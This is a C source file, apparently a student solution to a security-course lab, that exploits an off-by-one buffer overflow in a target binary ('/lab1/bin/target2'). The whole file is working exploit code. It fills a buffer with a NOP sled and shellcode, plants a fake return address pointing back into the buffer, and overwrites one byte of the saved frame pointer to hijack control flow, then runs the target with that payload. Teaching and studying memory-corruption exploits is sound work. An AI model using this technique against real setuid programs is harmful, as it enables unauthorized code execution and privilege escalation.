#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/lab1/bin/target2"

#define NOOP 0x90                 // no-op instruction
#define BUFLEN 336                // target buffer length
#define OVERWRITING_BYTE_LEN 1    // the extra byte we are overwritting to change FP
#define BUF_START 0xffffdba0      // where the shellcode starts
// current %ebp 0xffffdcf0 
// fake ret start: 0xffffdce8 (buf[328])
#define FAKE_RET_IDX 332

#define FAKE_SFP_IDX 328 // we don't care what's stored here since we've already taken
// the control of the system by the time we need to use this addr

#define OVERWRITING_BYTE 0xe8 // the extra byte we are overwritting to change FP

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[BUFLEN + OVERWRITING_BYTE_LEN];

  memset(buf, NOOP, sizeof(buf) - 1);

  // set the last byte in the buffer to be the overwritting byte
  buf[BUFLEN] = OVERWRITING_BYTE;

  // copy the shell code to be at the beginning of the buffer
  memcpy(buf, shellcode, sizeof(shellcode) - 1);

  // instert the fake return address into the end of the buffer, just before the overwritting byte
  *(unsigned int *)(buf + FAKE_RET_IDX) = BUF_START;

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
